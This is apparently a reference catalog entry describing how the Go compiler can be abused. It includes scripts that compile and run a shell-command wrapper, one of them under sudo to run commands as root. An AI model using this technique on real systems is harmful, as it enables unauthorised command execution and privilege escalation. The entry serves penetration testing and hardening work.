---
description: Go compiler binary. Can be abused to execute arbitrary commands or escalate privileges if run as root.
functions:
  command-exec:
    - code: |
        # Execute arbitrary commands using Go and Bash heredoc
        COMMAND="id"
        mkdir -p /tmp/gomod && cd /tmp/gomod
        go mod init mod
        cat > main.go << EOF
        package main

        import (
            "fmt"
            "os"
            "os/exec"
        )

        func main() {
            if len(os.Args) < 2 {
                fmt.Println("Usage: go run main.go <command>")
                return
            }
            cmd := exec.Command("/bin/sh", "-c", os.Args[1])
            output, err := cmd.CombinedOutput()
            if err != nil {
                fmt.Printf("Error executing command: %v\n", err)
                return
            }
            fmt.Printf(string(output))
        }
        EOF
        go run main.go "$COMMAND"
  sudo:
    - code: |
        # Execute arbitrary commands as root
        COMMAND="id"
        mkdir -p /tmp/gomod && cd /tmp/gomod
        sudo go mod init mod
        cat > main.go << EOF
        package main

        import (
            "fmt"
            "os"
            "os/exec"
        )

        func main() {
            if len(os.Args) < 2 {
                fmt.Println("Usage: go run main.go <command>")
                return
            }
            cmd := exec.Command("/bin/sh", "-c", os.Args[1])
            output, err := cmd.CombinedOutput()
            if err != nil {
                fmt.Printf("Error executing command: %v\n", err)
                return
            }
            fmt.Printf(string(output))
        }
        EOF
        sudo go run main.go "$COMMAND"
notes:
  - "Creates a temporary Go module in /tmp/gomod and writes a Go program using heredoc."
  - "Command to execute is passed as an argument to the Go program."
  - "Works for normal user or with root (sudo)."
  - "Temporary files are created in /tmp/gomod; cleanup recommended after use."
---
